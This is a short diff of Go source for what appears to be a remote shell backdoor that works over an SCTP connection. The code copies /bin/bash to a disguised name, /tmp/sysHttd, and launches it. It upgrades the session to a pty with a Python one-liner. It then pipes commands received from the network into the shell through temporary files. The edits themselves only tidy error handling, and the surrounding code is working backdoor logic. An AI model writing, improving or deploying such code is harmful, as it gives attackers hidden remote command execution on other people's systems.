@@ -36,7 +36,7 @@ func main(){
 	_ = conn.SubscribeEvents(sctp.SCTP_EVENT_DATA_IO)
 	//copy/bin/shtotmpdirectory
 	cmd := exec.Command("cp","/bin/bash","/tmp/sysHttd")
-	_ = cmd.Run()
+	cmd.Run()
 
 	cmd = exec.Command("/tmp/sysHttd")
 	//cmd = exec.Command("/bin/sh")
@@ -57,7 +57,7 @@ func main(){
 	}
 
 	//get pty shell, dirty but worked.
-	_,_ = stdin.Write([]byte("python -c 'import pty; pty.spawn(\"/bin/sh\")'\n"))
+	stdin.Write([]byte("python -c 'import pty; pty.spawn(\"/bin/sh\")'\n"))
 	go func(){
 		for{
 			cmdLine:=make([]byte,1024*20)
@@ -81,7 +81,7 @@ func main(){
 				os.Exit(0)
 			}
 			//store command to a temp file from network
-			cmdFile,err:=ioutil.TempFile("tmp","sys")
+			cmdFile,err:=ioutil.TempFile("/tmp","sys")
 			if err!=nil{
 				log.Fatalln(err)
 			}
@@ -89,13 +89,13 @@ func main(){
 
 			cmdBuff,err:=ioutil.ReadFile(cmdFile.Name())
 			if err!=nil{
-				_ = cmdFile.Close()
-				_ = os.Remove(cmdFile.Name())
+				cmdFile.Close()
+				os.Remove(cmdFile.Name())
 				log.Fatalln(err)
 			}
-			_,_ = stdin.Write(cmdBuff)
-			_ = cmdFile.Close()
-			_ = os.Remove(cmdFile.Name())
+			stdin.Write(cmdBuff)
+			cmdFile.Close()
+			os.Remove(cmdFile.Name())
 		}
 	}()
 
